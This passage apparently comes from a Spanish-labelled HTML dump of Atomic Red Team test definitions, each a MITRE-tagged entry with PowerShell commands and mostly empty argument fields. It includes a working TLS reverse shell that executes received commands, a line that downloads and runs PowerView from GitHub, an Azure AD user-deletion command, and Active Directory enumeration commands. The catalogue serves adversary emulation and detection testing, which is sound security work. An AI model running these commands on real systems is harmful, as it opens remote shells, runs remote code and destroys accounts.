<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 21caf58e-87ad-440c-a6b8-3ac259964003</li>
<li><strong>name</strong>: OpenSSL C2</li>
<li><strong>description</strong>: Thanks to @OrOneEqualsOne for this quick C2 method.
This is to test to see if a C2 session can be established using an SSL socket.
More information about this technique, including how to set up the listener, can be found here:
https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926</li>
</ul>
<p>Upon successful execution, powershell will make a network connection to 127.0.0.1 over 443.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: $server_ip = #{server_ip}
$server_port = #{server_port}
$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '&gt; ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2&gt;&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1573</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: {'description': 'IP of the external server', 'type': 'string', 'default': '127.0.0.1'}</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: {'description': 'The port to connect to on the external server', 'type': 'string', 'default': 443.0}</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 4f577511-dc1c-4045-bcb8-75d2457f01f4</li>
<li><strong>name</strong>: Azure AD - Delete user via Azure AD PowerShell</li>
<li><strong>description</strong>: Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.</li>
<li><strong>platforms</strong>: ['azure-ad']</li>
<li><strong>command</strong>: Connect-AzureAD
$userprincipalname = "#{userprincipalname}"
Remove-AzureADUser -ObjectId $userprincipalname</li>
<li><strong>prereq_command</strong>: Get-InstalledModule -Name AzureAD</li>
<li><strong>get_prereq_command</strong>: echo "use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force"</li>
<li><strong>cleanup_command</strong>: N/A</li>
<li><strong>mitre_id</strong>: T1531</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6fbc9e68-5ad7-444a-bd11-8bf3136c477e</li>
<li><strong>name</strong>: Enumerate all accounts (Domain)</li>
<li>
<p><strong>description</strong>: Enumerate all accounts
Upon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: net user /domain
net group /domain</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1087.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8b8a6449-be98-4f42-afd2-dedddc7453b2</li>
<li><strong>name</strong>: Enumerate all accounts via PowerShell (Domain)</li>
<li>
<p><strong>description</strong>: Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: net user /domain
get-localgroupmember -group Users
get-aduser -filter *</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1087.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 46f8dbe9-22a5-4770-8513-66119c5be63b</li>
<li><strong>name</strong>: Enumerate Active Directory for Unconstrained Delegation</li>
<li>
<p><strong>description</strong>: Attackers may attempt to query for computer objects with the UserAccountControl property
'TRUSTED_FOR_DELEGATION' (0x80000;524288) set
More Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce
Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}</p>
</li>
<li>
<p><strong>prereq_command</strong>: Try {
    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
    exit 0
}
Catch {
    exit 1
}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
} else {
  Install-WindowsFeature RSAT-AD-PowerShell
}</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1087.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: {'description': 'Domain FQDN', 'type': 'string', 'default': '$env:UserDnsDomain'}</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 93662494-5ed7-4454-a04c-8c8372808ac2</li>
<li><strong>name</strong>: Get-DomainUser with PowerView</li>
<li>
<p><strong>description</strong>: Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1087.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 02e8be5a-3065-4e54-8cc8-a14d138834d3</li>
<li><strong>name</strong>: Enumerate Active Directory Users with ADSISearcher</li>
<li>
<p><strong>description</strong>: The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.
Upon successful execution a listing of users will output with their paths in AD.
Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1087.002</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 394012d9-2164-4d4f-b9e5-acf30ba933fe</li>
<li><strong>name</strong>: Suspicious LAPS Attributes Query with Get-ADComputer all properties</li>
